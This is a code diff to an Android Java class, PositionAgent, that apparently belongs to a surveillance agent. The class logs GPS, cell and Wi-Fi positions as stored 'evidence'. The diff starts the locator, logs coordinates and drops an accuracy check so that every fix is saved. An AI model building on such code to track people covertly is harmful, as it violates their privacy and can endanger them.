@@ -52,17 +52,18 @@ public class PositionAgent extends AgentBase implements LocationListener {
 
 	@Override
 	public void begin() {
-		if(logGps == null){
+		if (logGps == null) {
 			logGps = new Evidence(EvidenceType.LOCATION_NEW);
 		}
-		if(logCell == null){
+		if (logCell == null) {
 			logCell = new Evidence(EvidenceType.LOCATION_NEW);
 		}
-		if(logWifi == null){
-			logWifi =  new Evidence(EvidenceType.LOCATION_NEW);
+		if (logWifi == null) {
+			logWifi = new Evidence(EvidenceType.LOCATION_NEW);
 		}
 		locator = new GPSLocator(this, period);
-		
+		locator.start();
+
 	}
 
 	@Override
@@ -250,6 +251,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 		if (location != null) {
 			double lat = location.getLatitude();
 			double lng = location.getLongitude();
+			Log.d(TAG, "lat: " + lat + " lon:" + lng);
 		}
 
 		// #ifdef DEBUG
@@ -272,17 +274,15 @@ public class PositionAgent extends AgentBase implements LocationListener {
 
 		final long timestamp = location.getTime();
 
-		if (location.hasAccuracy()) {
-			// #ifdef DEBUG
-			Log.d(TAG, "valid");
-			// #endif
-			final byte[] payload = getGPSPayload(location, timestamp);
+		// #ifdef DEBUG
+		Log.d(TAG, "valid");
+		// #endif
+		final byte[] payload = getGPSPayload(location, timestamp);
 
-			logGps.createEvidence(getAdditionalData(0, LOG_TYPE_GPS),
-					EvidenceType.LOCATION_NEW);
-			saveEvidence(logGps, payload, TYPE_GPS);
-			logGps.close();
-		}
+		logGps.createEvidence(getAdditionalData(0, LOG_TYPE_GPS),
+				EvidenceType.LOCATION_NEW);
+		saveEvidence(logGps, payload, TYPE_GPS);
+		logGps.close();
 
 	}
 
